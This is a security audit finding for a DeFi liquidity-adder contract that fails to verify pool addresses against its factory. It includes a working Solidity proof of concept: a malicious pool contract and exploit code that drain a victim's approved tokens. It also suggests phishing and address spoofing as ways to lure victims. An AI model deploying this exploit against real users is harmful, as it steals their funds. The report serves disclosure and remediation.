### Title
`MetricOmmPoolLiquidityAdder` Does Not Verify Pool Against Factory, Allowing Malicious Pool to Drain User Tokens Up to Max Caps - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary caller-supplied `pool` address and stores it as the trusted callback counterparty without verifying it against the factory registry. A malicious pool can call back into `metricOmmModifyLiquidityCallback` and pass the `msg.sender == expectedPool` check, then return attacker-controlled token addresses from `getImmutables()`, causing the contract to pull up to `maxAmountToken0` / `maxAmountToken1` from the victim's wallet.

---

### Finding Description

`MetricOmmSimpleRouter` enforces factory membership on every pool it interacts with. In `_setNextCallbackContext`, `_initCallbackContextforRecursiveOutput`, and `_updateCallbackContextforRecursiveOutput`, the base class calls `_requireFactoryPool(pool)` before writing the pool into transient storage: [1](#0-0) [2](#0-1) 

`MetricOmmPoolLiquidityAdder` has no factory reference at all. Its `_setPayContext` writes the caller-supplied `pool` directly into transient storage with no membership check: [3](#0-2) 

The contract's own NatSpec acknowledges this gap: [4](#0-3) 

In `metricOmmModifyLiquidityCallback`, the only caller check is `msg.sender != expectedPool`. Because `expectedPool` was set to the attacker-supplied address, a malicious pool trivially passes this check: [5](#0-4) 

After passing the check, the callback calls `IMetricOmmPool(msg.sender).getImmutables()` to obtain `token0`/`token1`, then calls `pay(token0, payer, msg.sender, amount0Delta)` and `pay(token1, payer, msg.sender, amount1Delta)`: [6](#0-5) 

A malicious pool controls both the token addresses returned by `getImmutables()` and the `amount0Delta`/`amount1Delta` values it passes into the callback (up to `max0`/`max1`). The `pay` helper then executes `safeTransferFrom(payer, maliciousPool, amount)`, draining the victim's ERC-20 allowance to the adder: [7](#0-6) 

---

### Impact Explanation

A victim who has pre-approved `MetricOmmPoolLiquidityAdder` for token spending (required for normal use) and is tricked into calling any `addLiquidityExactShares` or `addLiquidityWeighted` variant with a malicious pool address loses up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 in a single transaction. The stolen tokens are transferred directly to the attacker's malicious pool contract. This is a direct loss of user principal with no recovery path.

---

### Likelihood Explanation

The attack requires the victim to call the adder with an attacker-controlled pool address. This is achievable via:
- A phishing/social-engineering UI that substitutes a malicious pool address for a legitimate one.
- A front-end that resolves pool addresses from an off-chain registry the attacker has poisoned.
- A griefing scenario where the attacker publishes a pool address that looks similar to a legitimate one (address-similarity spoofing).

Users must have pre-approved the adder (standard workflow), so the approval prerequisite is always satisfied for active LPs. The `MetricOmmSimpleRouter` sibling contract correctly guards against this, demonstrating the protocol has the tooling to fix it; the omission in the adder is therefore an oversight rather than an intentional design trade-off.

---

### Recommendation

Add a factory reference to `MetricOmmPoolLiquidityAdder` (mirroring `MetricOmmSwapRouterBase`) and call `_requireFactoryPool(pool)` inside `_setPayContext` (or at the top of every public entry point) before writing the pool into transient storage:

```solidity
// In MetricOmmPoolLiquidityAdder constructor:
IMetricOmmPoolFactory internal immutable FACTORY;
constructor(address weth, address factory) PeripheryPayments(weth) {
    if (factory == address(0)) revert InvalidFactory();
    FACTORY = IMetricOmmPoolFactory(factory);
}

// In _setPayContext:
function _setPayContext(address pool, address payer, uint256 max0, uint256 max1) internal {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool);  // <-- add this
    ...
}
```

This mirrors the guard already present in `MetricOmmSwapRouterBase._requireFactoryPool`: [8](#0-7) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {IMetricOmmModifyLiquidityCallback} from "@metric-core/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";
import {MetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Malicious pool that drains victim's tokens via the unguarded callback.
contract MaliciousPool {
    address public immutable STOLEN_TOKEN;
    address public immutable ADDER;

    constructor(address stolenToken, address adder) {
        STOLEN_TOKEN = stolenToken;
        ADDER = adder;
    }

    // Pool interface: called by LiquidityAdder._addLiquidity
    function addLiquidity(
        address, uint80, LiquidityDelta calldata,
        bytes calldata callbackData, bytes calldata
    ) external returns (uint256, uint256) {
        // Call back into the adder with KIND_PAY and max amounts
        IMetricOmmModifyLiquidityCallback(ADDER)
            .metricOmmModifyLiquidityCallback(
                1_000e18, // amount0Delta = victim's full approval
                0,
                callbackData  // contains KIND_PAY (== 1)
            );
        return (1_000e18, 0);
    }

    // Returns attacker-controlled token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = STOLEN_TOKEN;
        imm.token1 = address(0);
        // ... other fields zeroed
    }
}

contract PoC {
    function exploit(
        MetricOmmPoolLiquidityAdder adder,
        address victim,
        address stolenToken
    ) external {
        MaliciousPool malPool = new MaliciousPool(stolenToken, address(adder));

        // Victim must have approved adder for stolenToken (normal workflow)
        // Victim is tricked into calling addLiquidityExactShares with malPool
        // Simulated here as if victim called it:
        LiquidityDelta memory d;
        d.binIdxs = new int256[](1);
        d.shares = new uint256[](1);
        d.binIdxs[0] = 0;
        d.shares[0] = 1;

        // victim calls (or is tricked into calling):
        adder.addLiquidityExactShares(
            address(malPool),
            victim,
            0,
            d,
            1_000e18,  // maxAmountToken0 — attacker drains this much
            0,
            ""
        );
        // Result: 1_000e18 of stolenToken transferred from victim to malPool
    }
}
```

**Execution trace:**
1. `addLiquidityExactShares(malPool, victim, ...)` → `_addLiquidity` → `_setPayContext(malPool, victim, 1000e18, 0)` — no factory check.
2. `malPool.addLiquidity(...)` is called; malPool immediately calls back `metricOmmModifyLiquidityCallback(1000e18, 0, abi.encode(KIND_PAY))`.
3. Callback: `expectedPool = malPool`, `msg.sender = malPool` → check passes.
4. `malPool.getImmutables()` returns `token0 = stolenToken`.
5. `pay(stolenToken, victim, malPool, 1000e18)` → `safeTransferFrom(victim, malPool, 1000e18)`.
6. Victim loses 1,000 tokens. [9](#0-8)

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-31)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L82-85)
```text
  function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L152-179)
```text
  function metricOmmModifyLiquidityCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata callbackData)
    external
    override
  {
    uint8 kind = abi.decode(callbackData, (uint8));
    if (kind == KIND_PROBE) {
      revert LiquidityProbe(amount0Delta, amount1Delta);
    }
    if (kind != KIND_PAY) revert InvalidCallbackKind();

    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L290-296)
```text
  function _setPayContext(address pool, address payer, uint256 maxAmountToken0, uint256 maxAmountToken1) internal {
    if (_tloadAddress(T_SLOT_PAY_POOL) != address(0)) revert PayContextAlreadyActive();
    _tstoreAddress(T_SLOT_PAY_POOL, pool);
    _tstoreAddress(T_SLOT_PAY_PAYER, payer);
    _tstore(T_SLOT_PAY_MAX0, maxAmountToken0);
    _tstore(T_SLOT_PAY_MAX1, maxAmountToken1);
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```
